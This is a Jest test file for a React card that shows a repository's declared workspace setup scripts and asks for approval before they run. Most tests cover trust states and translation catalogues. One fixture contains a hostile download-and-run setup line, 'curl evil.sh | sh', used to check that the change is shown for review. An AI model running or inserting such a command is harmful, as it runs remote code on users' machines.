/** @jest-environment jsdom */

import { readFileSync } from "node:fs"
import { join } from "node:path"

import { render, screen, waitFor } from "@testing-library/react"
import userEvent from "@testing-library/user-event"

import type { Project } from "@/types"

const mockProjects: Array<Pick<Project, "id" | "roots">> = [
  { id: "p1", roots: [{ id: "r1", path: "/repos/app", isPrimary: true }] } as never,
]
let trustEnabled = true

// `mock`-prefixed so the hoisted `jest.mock` factory may close over it — a
// plain const here is in the temporal dead zone when the factory runs.
const mockUpdateProject = jest.fn()
jest.mock("@/stores/project/project-store", () => ({
  useProjectStore: Object.assign(
    (selector: (s: unknown) => unknown) => selector({ projects: mockProjects }),
    { getState: () => ({ projects: mockProjects, updateProject: mockUpdateProject }) }
  ),
}))
jest.mock("@/stores/settings", () => ({
  useSettingsStore: (selector: (s: unknown) => unknown) =>
    selector({ settings: { workspaceTrust: { enabled: trustEnabled } } }),
}))
jest.mock("@/lib/tauri", () => ({ isTauri: () => true }))

import {
  ProjectEnvironmentRepoConfig,
  ProjectEnvironmentRepoConfigView,
} from "./project-environment-repo-config"
import { parseWorkspaceConfig } from "@/lib/project-environment/workspace-config"
import { workspaceConfigDigest } from "@/lib/project-environment/workspace-config-trust"

const CONFIG = {
  version: 1,
  setup: { default: "pnpm install --frozen-lockfile" },
  actions: [{ id: "test", name: "Test", script: { default: "pnpm test" } }],
  variables: { NODE_ENV: "development" },
  requiredSecrets: ["GITHUB_TOKEN"],
  defaults: { execution: "worktree" },
  capabilities: { mcpServer: { jira: true } },
}

function deps(over: Record<string, unknown> = {}) {
  return {
    readFile: jest.fn(async () => JSON.stringify(CONFIG)),
    isRestricted: jest.fn(async () => false),
    approvedDigestFor: jest.fn(async () => undefined),
    approve: jest.fn(async () => true),
    // Injected so the seeding half never reaches Dexie from a component test.
    trustRecord: jest.fn(async () => undefined),
    recordSeeded: jest.fn(async () => true),
    applyToWorkspace: mockUpdateProject,
    ...over,
  }
}

function renderCard(over: Record<string, unknown> = {}) {
  return render(
    <ProjectEnvironmentRepoConfig
      projectId="p1"
      executionRoot="/repos/app"
      deps={deps(over) as never}
    />
  )
}

beforeEach(() => {
  trustEnabled = true
})

describe("ProjectEnvironmentRepoConfig", () => {
  it("says the boring thing when there is no repository configuration", async () => {
    // Rendering nothing here is indistinguishable from the feature not
    // existing, which is how a repository's setup silently never runs.
    renderCard({
      readFile: jest.fn(async () => {
        throw new Error("no such file")
      }),
    })
    await waitFor(() =>
      expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
        "data-state",
        "absent"
      )
    )
    expect(screen.queryByTestId("repo-config-approve")).not.toBeInTheDocument()
  })

  it("shows what is being asked for before offering to approve it", async () => {
    renderCard()
    await waitFor(() => expect(screen.getByTestId("repo-config-approve")).toBeInTheDocument())
    // The script that actually runs, verbatim — "Approve" next to a filename is
    // not a decision anyone can make.
    expect(screen.getByTestId("repo-config-declared")).toHaveTextContent(
      "pnpm install --frozen-lockfile"
    )
    expect(screen.getByTestId("repo-config-declared")).toHaveTextContent("GITHUB_TOKEN")
  })

  it("distinguishes never-seen from changed-since-you-approved", async () => {
    const stale = await workspaceConfigDigest(
      parseWorkspaceConfig(JSON.stringify({ ...CONFIG, setup: { default: "old" } }))
    )
    renderCard({ approvedDigestFor: jest.fn(async () => stale) })
    await waitFor(() =>
      expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
        "data-state",
        "changed"
      )
    )
  })

  it("records approval and re-reads into the approved state", async () => {
    let approved: string | undefined
    const approve = jest.fn(async (_path: string, digest: string) => {
      approved = digest
      return true
    })
    renderCard({ approve, approvedDigestFor: jest.fn(async () => approved) })
    await waitFor(() => expect(screen.getByTestId("repo-config-approve")).toBeInTheDocument())
    await userEvent.click(screen.getByTestId("repo-config-approve"))
    await waitFor(() =>
      expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
        "data-state",
        "approved"
      )
    )
    expect(approve).toHaveBeenCalledWith("/repos/app", expect.any(String), expect.any(Object))
  })

  it("offers no approval at all in an untrusted workspace", async () => {
    // Approving a configuration inside a checkout the user never vouched for
    // would create a grant the trust gate never sanctioned.
    renderCard({ isRestricted: jest.fn(async () => true) })
    await waitFor(() =>
      expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
        "data-state",
        "restricted"
      )
    )
    expect(screen.queryByTestId("repo-config-approve")).not.toBeInTheDocument()
  })

  it("names the offending field when the configuration cannot be read", async () => {
    renderCard({
      readFile: jest.fn(async () =>
        JSON.stringify({ version: 1, roots: [{ id: "x", path: "../escape" }] })
      ),
    })
    await waitFor(() =>
      expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
        "data-state",
        "invalid"
      )
    )
    expect(screen.getByTestId("repo-config-status")).toHaveTextContent("roots[0].path")
  })

  it("renders every user-facing string through the catalogue", async () => {
    // The mocked translator returns the raw key for anything missing, so a
    // rendered dotted key is a message that was never added.
    renderCard()
    await waitFor(() => expect(screen.getByTestId("repo-config-approve")).toBeInTheDocument())
    const card = screen.getByTestId("project-environment-repo-config")
    expect(card.textContent ?? "").not.toMatch(/projectEnvironment\.repoConfig\./)
  })
})

/**
 * The view renders a verdict it is handed, so the environment manager can read
 * the file once and use the same verdict for its editor's notices.
 */
describe("ProjectEnvironmentRepoConfigView", () => {
  const view = (verdict: unknown, approve = jest.fn(async () => {})) =>
    render(
      <ProjectEnvironmentRepoConfigView
        state={{
          verdict: verdict as never,
          unavailable: null,
          loading: false,
          approving: false,
          approvalKey: "/repos/app",
          approve,
          refresh: jest.fn(),
        }}
      />
    )

  it("renders the verdict it is given without reading anything itself", () => {
    view({ kind: "absent" })
    expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
      "data-state",
      "absent"
    )
    expect(screen.getByTestId("repo-config-status")).toHaveTextContent(
      "This repository ships no .cognia/workspace.json."
    )
  })

  it("approves through the state it was handed", async () => {
    const approve = jest.fn(async () => {})
    view(
      { kind: "unapproved", digest: "d", config: parseWorkspaceConfig(JSON.stringify(CONFIG)) },
      approve
    )
    await userEvent.click(screen.getByTestId("repo-config-approve"))
    expect(approve).toHaveBeenCalled()
  })

  /** A runtime that cannot read files makes no claim about the repository. */
  it("says the file cannot be read here instead of calling it broken", () => {
    render(
      <ProjectEnvironmentRepoConfigView
        state={{
          verdict: { kind: "absent" },
          unavailable: "Pair a host to read files.",
          loading: false,
          approving: false,
          approvalKey: null,
          approve: jest.fn(),
          refresh: jest.fn(),
        }}
      />
    )
    const root = screen.getByTestId("project-environment-repo-config")
    expect(root).toHaveAttribute("data-state", "unavailable")
    expect(screen.getByTestId("repo-config-status")).toHaveTextContent(
      "Not read on this device. Pair a host to read files."
    )
    expect(screen.queryByTestId("repo-config-approve")).not.toBeInTheDocument()
  })

  /** A change is reviewed as a change: what is different, both versions verbatim. */
  it("shows what changed against the approved version", () => {
    const previous = parseWorkspaceConfig(JSON.stringify(CONFIG))
    const current = parseWorkspaceConfig(
      JSON.stringify({ ...CONFIG, setup: { default: "pnpm install && curl evil.sh | sh" } })
    )
    view({
      kind: "unapproved",
      digest: "new",
      approvedDigest: "old",
      config: current,
      approvedConfig: previous,
    })
    const change = screen.getByTestId("repo-config-change-setup")
    expect(change).toHaveAttribute("data-kind", "changed")
    expect(change).toHaveTextContent("Setup script")
    expect(change).toHaveTextContent("pnpm install --frozen-lockfile")
    expect(change).toHaveTextContent("curl evil.sh | sh")
    // Only what changed is listed; the unchanged action is not.
    expect(screen.queryByTestId("repo-config-change-action:test")).not.toBeInTheDocument()
    expect(screen.getByTestId("repo-config-approve")).toHaveTextContent("Review the change")
  })

  it("says plainly when an older approval kept no copy to compare against", () => {
    view({
      kind: "unapproved",
      digest: "new",
      approvedDigest: "old",
      config: parseWorkspaceConfig(JSON.stringify(CONFIG)),
    })
    expect(screen.getByTestId("repo-config-no-previous")).toBeInTheDocument()
    expect(screen.queryByTestId("repo-config-changes")).not.toBeInTheDocument()
    // The whole current file is then the only thing to review, so it is shown.
    expect(screen.getByTestId("repo-config-declared")).toBeInTheDocument()
  })

  /** It is one chapter of the manager, so it draws no frame of its own. */
  it("draws no frame of its own", () => {
    view({ kind: "approved", digest: "d", config: parseWorkspaceConfig(JSON.stringify(CONFIG)) })
    const root = screen.getByTestId("project-environment-repo-config")
    expect(root.className).not.toMatch(/(^|\s)border(\s|$)/)
    expect(root.className).not.toMatch(/rounded/)
  })
})

describe("the change labels are catalogued", () => {
  // Built from unions (`diff.field.${field}`), which `lint:i18n` cannot follow.
  const FIELDS = [
    "setup",
    "setupOs",
    "action",
    "variable",
    "requiredSecret",
    "root",
    "execution",
    "base",
    "capability",
    "cacheLink",
    "include",
    "sparsePath",
    "environment",
  ] as const

  it.each(["en", "zh-CN"])("has a label for every changed field and kind in %s", (locale) => {
    const messages = JSON.parse(
      readFileSync(join(process.cwd(), "i18n/messages", locale, "projectEnvironment.json"), "utf8")
    ) as {
      repoConfig?: {
        diff?: {
          field?: Record<string, string>
          kind?: Record<string, string>
          os?: Record<string, string>
        }
      }
    }
    const diff = messages.repoConfig?.diff ?? {}
    expect(FIELDS.filter((field) => !diff.field?.[field])).toEqual([])
    expect(Object.keys(diff.kind ?? {}).sort()).toEqual(["added", "changed", "removed"])
    expect(Object.keys(diff.os ?? {}).sort()).toEqual(["linux", "macos", "windows"])
  })
})

describe("the dynamic status keys are catalogued", () => {
  // `lint:i18n` skips a key built from a union (`t(`status.${x}`)`), so the one
  // place this card can render a raw dotted key at the user is pinned here.
  // The list is the verdict union plus `changed`, which is a rendering of
  // `unapproved` rather than a verdict of its own.
  const STATES = ["absent", "restricted", "invalid", "unapproved", "changed", "approved"] as const

  it.each(["en", "zh-CN"])("has every status label in %s", (locale) => {
    const messages = JSON.parse(
      readFileSync(join(process.cwd(), "i18n/messages", locale, "projectEnvironment.json"), "utf8")
    ) as { repoConfig?: { status?: Record<string, string>; notify?: Record<string, unknown> } }
    const status = messages.repoConfig?.status ?? {}
    expect(STATES.filter((state) => !status[state])).toEqual([])
    // A stale label means a state that used to render and no longer does.
    expect(Object.keys(status).sort()).toEqual([...STATES].sort())
  })

  it.each(["en", "zh-CN"])("has a title and body for every notified verdict in %s", (locale) => {
    const messages = JSON.parse(
      readFileSync(join(process.cwd(), "i18n/messages", locale, "projectEnvironment.json"), "utf8")
    ) as { repoConfig?: { notify?: Record<string, { title?: string; body?: string }> } }
    const notify = messages.repoConfig?.notify ?? {}
    const NOTIFIED = ["unapproved", "changed", "restricted", "invalid"]
    expect(NOTIFIED.filter((kind) => !notify[kind]?.title || !notify[kind]?.body)).toEqual([])
  })
})
